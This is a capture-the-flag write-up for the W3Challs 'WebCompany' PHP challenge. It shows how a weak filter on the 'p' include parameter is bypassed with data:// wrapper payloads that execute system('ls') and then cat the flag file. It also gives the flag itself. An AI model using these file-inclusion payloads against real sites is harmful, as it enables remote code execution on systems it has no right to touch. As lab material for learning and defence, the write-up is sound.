# WebCompany

1. First, lets go through the [website](http://webcompany.hax.w3challs.com/) and read the [source code](https://git.w3challs.com/challenges/hax/tree/master/webcompany).
2. Then, we press the contact and services button on the website, we could find out an interesting parameter "p". 
3. Now, lets look up the source code of the index.php.
    ```php=
    <?php

    ob_start();

    (include_once 'config.php') === false
        ? die
        : (include_once $incDir .'/'. $securityFile . $incExt) === false
            ? die
            : (include_once $incDir .'/'. $headerFile . $incExt) === false
                ? die
                : isset($_GET['p'])
                    ? is_string($_GET['p'])
                        ? secure($_GET['p'])
                            ? include $_GET['p'] . $pageExt
                            : include_once 'home' . $pageExt
                        : include_once 'home' . $pageExt
                    : include_once 'home' . $pageExt;
    (include_once $incDir .'/'. $footerFile . $incExt) === false
        ? ob_clean()
        : null ;

    ob_end_flush();

    ?>
    ```
    We know that it get "p" to find the page and use the function secure to make sure that the words cannot influence the work. However, we look up the sercurity.inc.php in inc file.
    ```php=
    <?php

    if( defined('CONFIG') === false ) die;

    function secure($url)
    {
        define('START',   1);
        define('END',     2);
        define('CONTAIN', 4);
        define('MATCH',   8);

        $filters = Array(
            'http://'  => START,
            'https://' => START,
            'ftp://'   => START,
            'ftps://'  => START,
            'file://'  => START,
            '/'        => START,
            '..'       => CONTAIN
        );

        foreach ($filters AS $rule => $type)
        {
            $rule = preg_quote($rule);
            switch ($type)
            {
                case START   : $pattern = '#^'.$rule.'#i';  break;
                case END     : $pattern = '#'.$rule.'$#i';  break;
                case CONTAIN : $pattern = '#'.$rule.'#i';   break;
                case MATCH   : $pattern = '#^'.$rule.'$#i'; break;
            }
            if (preg_match($pattern, $url))
                return false;
        }

        return true;
    }

    ?>
    ```
    We know that we are not able to use the words in the filter as the payload.
4. This is a attack called [LFI attack](https://en.wikipedia.org/wiki/File_inclusion_vulnerability). I use the payload in the [website](https://ctf-wiki.github.io/ctf-wiki/web/php/php/). Here is my payload. 
    ```url=
    http://webcompany.hax.w3challs.com/index.php?p=data://text/plain,%3C?php%20system(%22ls%22);?%3E
    ```
    Here is the response.
    ```html=
    config.php
    contact.page.php
    home.page.php
    inc
    index.php
    services.page.php
    style
    yo
    .page.php
    ```
    Then, I use `chdir(yo)` to visit the file and `system("ls")` it. Finally, I get the flag. Here is my payload.
    ```url=
    http://webcompany.hax.w3challs.com/index.php?p=data://text/plain,?php%20chdir(yo);chdir(dawg);chdir(i);chdir(herd);chdir(you);chdir(like);chdir(flagz);system(%22cat%20flagz%22);?%3E
    ```
5. Here is the flag : W3C{d4fuck allow_url_include 1s 0n?!}
